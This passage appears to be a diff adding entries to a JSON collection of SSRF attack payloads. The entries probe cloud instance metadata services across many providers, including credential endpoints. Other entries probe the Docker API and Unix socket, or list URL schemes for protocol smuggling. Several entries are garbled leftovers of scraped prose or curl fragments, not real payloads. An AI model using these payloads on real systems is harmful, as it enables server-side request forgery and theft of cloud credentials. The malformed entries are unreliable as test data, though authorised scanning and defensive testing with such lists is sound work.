+    "injection_point": "query_parameter",
+    "payload_string": "-H \"Content-Type: application/json\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242922",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "--data '{\"items\": [{\"key\": \"sshkeyname\", \"value\": \"sshkeyvalue\"}]}'",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242923",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/metadata/v1/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242924",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242925",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "All in one request:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242926",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/metadata/v1/maintenance",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242927",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/metadata/instance?api-version=2017-04-02",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242928",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242929",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/openstack",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242930",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/2009-04-04/meta-data/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242931",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://192.0.0.192/latest/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242932",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://192.0.0.192/latest/user-data/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242933",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://192.0.0.192/latest/meta-data/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242934",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://192.0.0.192/latest/attributes/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242935",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://100.100.100.200/latest/meta-data/image-id",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242936",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/hetzner/v1/metadata",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242937",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/hetzner/v1/metadata/hostname",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242938",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/hetzner/v1/metadata/instance-id",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242939",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/hetzner/v1/metadata/public-ipv4",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242940",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/hetzner/v1/metadata/private-networks",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242941",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/hetzner/v1/metadata/availability-zone",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242942",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/hetzner/v1/metadata/region",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242943",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://127.0.0.1:2375/v1.24/containers/json",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242944",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Simple example",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242945",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/containers/json",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242946",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/images/json",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-247972",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "dict",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-247973",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "file",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-247974",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "ftp",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-247975",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "ftps",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-247976",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "gopher",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-247977",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "gophers",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-247978",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-247979",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "imap",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-247980",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "imaps",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-247981",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "ldap",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-247982",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "ldaps",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-247983",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "mqtt",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-247984",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "pop3",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-247985",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "pop3s",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-247986",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "rtmp",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-247987",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "rtmpe",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-247988",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "rtmps",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-247989",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "rtmpt",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-247990",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "rtmpte",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-247991",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "rtmpts",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-247992",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "rtsp",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-247993",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "scp",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-247994",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "sftp",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-247995",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "smb",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-247996",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "smbs",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-247997",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "smtp",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-247998",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "smtps",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-247999",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "telnet",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-248000",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "tftp",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-248001",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "ws",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-248002",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "wss",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-408987",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://[fd00:ec2::254]/latest/meta-data/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-408988",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.170.2/v2/credentials/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-408989",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.170.2/v2/metadata",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-408990",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-408991",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/opc/v1/instance/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-408992",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/opc/v2/instance/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-408993",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/opc/v2/instance/metadata/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-408994",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://metadata.tencentyun.com/latest/meta-data/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-408995",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/metadata/instance/compute?api-version=2021-01-01",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
   }
 ]
